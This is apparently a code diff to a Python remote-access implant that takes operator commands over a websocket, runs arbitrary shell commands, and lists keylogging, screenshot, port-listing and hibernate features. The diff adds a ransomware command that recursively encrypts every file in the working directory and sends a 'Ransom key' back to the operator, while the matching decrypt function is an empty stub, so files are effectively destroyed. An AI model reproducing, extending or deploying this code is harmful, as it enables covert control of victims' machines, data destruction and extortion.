@@ -1,25 +1,63 @@
+#libs
 import json
 import psutil
 import random
 import time
 import websocket
-
+from cryptography.fernet import Fernet
 #reverse shell utils
 import os
 import subprocess
 
-#zozzata
+#container data
 import socket
 
 hibernate_time = False
 device_us = socket.gethostname()
-destroyed= False
+destroyed = False
+
+
+
+def encrypt(directory, key):
+    
+    files = []
+    for file in os.listdir(directory):
+        full_path = os.path.join(directory, file)
+
+        if os.path.isfile(full_path):
+            files.append(full_path)
+
+        elif os.path.isdir(full_path):
+            encrypt(full_path, key)
+
+    for file in files:
+        with open(file, 'rb') as f:
+            data = f.read()
+        
+        fernet = Fernet(key)
+        encrypted_data = fernet.encrypt(data)
+
+        with open(file, 'wb') as f:
+            f.write(encrypted_data)
+        
+
+
+
+
+def decrypt(cwd, key):
+    pass
+
+
+
+
+
+
 
 def on_message(ws, message): 
     global hibernate_time 
     data = json.loads(message)
     inp = data.get("message")
-    
+    cwd = os.getcwd()
     
     if inp.startswith('>'):    
         command = inp[1:].strip().lower()
@@ -29,17 +67,30 @@ def on_message(ws, message):
         
         elif command == "help":    
             msg = """List of additional commands available:\n
-        Clear               Clear Chat Room Messages
-        Infos               Get Device Informations
-        Keylog [x]          Start Keylogging [OPTIONS], Set a x Timer to stop keylog (Root Permissions Required)     
-        Listen              List Of Open Ports
-        Screenshot          Receive Screenshot
-        Selfdestroy         Destroy This Agent
-        Hibernate [x]       Cut Connection And Block Sending Lookup Requests For x Seconds      
-        Quit                Cut Connection, Lookup Requests Will Start Then
-        Help                Open List Of Available Commands 
+        Clear               Clear chat room messages
+        Encrypt             Encrypt all the files in this directory and its subdirectories
+        Infos               Get device informations
+        Keylog [x]          Start Keylogger [OPTIONS], set a x timer to stop keylog (X11 Server required)     
+        Listen              List of open ports
+        Screenshot          Receive screenshot (developing)
+        Selfdestroy         Destroy this agent
+        Hibernate [x]       Cut connection and block sending lookup requests for x seconds      
+        Quit                Cut connection, lookup requests will start then
+        Help                Open list of available commands 
 
     """
+
+        elif command == "encrypt":
+            key = Fernet.generate_key()
+            ws.send(json.dumps({"message":"Ransom key\n"+str(key)+"\n", 
+                                "sender": "",
+                                "agent":device_us}))
+            encrypt(cwd, key)
+            
+        
+        elif command=="decrypt":
+            decrypt(cwd, key)
+            
 
         elif command == "listen":
             cm = "ss -tuln"
@@ -147,7 +198,10 @@ def on_message(ws, message):
 
         elif command.startswith("cd "):
             try:
+                if command[3:].strip() == "":
+                     os.chdir(os.path.expanduser("~"))
                 os.chdir(command[3:].strip())
+                cwd = os.getcwd()
                 msg = ''
             except FileNotFoundError:
                 msg = "Directory not found"
@@ -155,7 +209,7 @@ def on_message(ws, message):
             p = subprocess.run(inp[2:], shell=True, capture_output=True, text=True)
             msg = p.stdout + p.stderr
             print(msg)
-        cwd = os.getcwd()
+        
         ws.send(json.dumps({"message": '$' + cwd + '\n\n' + msg, "sender": "", "agent":device_us}))
 
 
@@ -197,19 +251,18 @@ def connect():
 
 def monitor():
     while True:
-        # Ottieni l'utilizzo della CPU
+        #gain cpu stats
         cpu_percent = psutil.cpu_percent(interval=1)
-        print(f"Utilizzo della CPU: {cpu_percent}%")
+        print(f"CPU usage: {cpu_percent}%")
 
-        # Ottieni l'utilizzo della memoria
+        #gain meme stats
         memory_info = psutil.virtual_memory()
-        total_memory = memory_info.total / (1024 ** 2)  # Converti in MB
-        available_memory = memory_info.available / (1024 ** 2)  # Converti in MB
+        total_memory = memory_info.total / (1024 ** 2)  # to MB
+        available_memory = memory_info.available / (1024 ** 2)  # to MB
         used_memory = total_memory - available_memory
         memory_percent = memory_info.percent
-        print(f"Utilizzo della memoria: {used_memory:.2f} MB / {total_memory:.2f} MB ({memory_percent:.2f}%)")
+        print(f"Mem usage: {used_memory:.2f} MB / {total_memory:.2f} MB ({memory_percent:.2f}%)")
 
-        # Intervallo di aggiornamento
         return cpu_percent, memory_percent
 
 
@@ -219,10 +272,10 @@ if __name__ == "__main__":
     while True:
         if destroyed == True:
             break
-        connect()
-        if hibernate_time != False:#se la var globale non è False, addormentati
+
+        if hibernate_time != False:#sleep if True
             time.sleep(hibernate_time)
-        hibernate_time = False #resetta per evitare effetti indesiderati
+        hibernate_time = False #rese var
 
         x = monitor()
         base = 2.5
@@ -241,8 +294,8 @@ if __name__ == "__main__":
             jitter = random.uniform(400, 600)
             lookup = base * jitter
 
-        lookup = 5 #REMOVE OUT OF TESTING
-
+        lookup = 5 #test
+        
         print(lookup)
         time.sleep(lookup)
-
+        connect()
